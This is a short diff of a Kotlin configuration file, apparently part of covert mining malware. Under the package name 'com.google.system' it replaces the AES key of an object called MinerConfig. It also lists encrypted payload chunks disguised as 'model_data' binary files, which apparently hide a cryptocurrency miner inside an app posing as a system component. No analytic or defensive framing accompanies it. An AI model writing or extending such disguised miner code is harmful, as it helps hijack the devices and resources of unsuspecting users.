@@ -2,6 +2,6 @@
 package com.google.system
 
 object MinerConfig {
-    val MINER_AES_KEY: ByteArray = byteArrayOf((188).toByte(),(63).toByte(),(24).toByte(),(220).toByte(),(138).toByte(),(212).toByte(),(133).toByte(),(98).toByte(),(160).toByte(),(241).toByte(),(51).toByte(),(213).toByte(),(7).toByte(),(141).toByte(),(212).toByte(),(185).toByte(),(82).toByte(),(214).toByte(),(191).toByte(),(218).toByte(),(180).toByte(),(25).toByte(),(12).toByte(),(21).toByte(),(27).toByte(),(127).toByte(),(75).toByte(),(28).toByte(),(168).toByte(),(44).toByte(),(139).toByte(),(90).toByte())
+    val MINER_AES_KEY: ByteArray = byteArrayOf((185).toByte(),(29).toByte(),(198).toByte(),(250).toByte(),(255).toByte(),(58).toByte(),(154).toByte(),(10).toByte(),(230).toByte(),(198).toByte(),(138).toByte(),(120).toByte(),(206).toByte(),(106).toByte(),(30).toByte(),(61).toByte(),(102).toByte(),(3).toByte(),(244).toByte(),(187).toByte(),(28).toByte(),(127).toByte(),(241).toByte(),(128).toByte(),(95).toByte(),(113).toByte(),(21).toByte(),(153).toByte(),(174).toByte(),(225).toByte(),(191).toByte(),(58).toByte())
     val MINER_CHUNK_NAMES: Array<String> = arrayOf("model_data_0.bin","model_data_1.bin","model_data_2.bin","model_data_3.bin")
 }
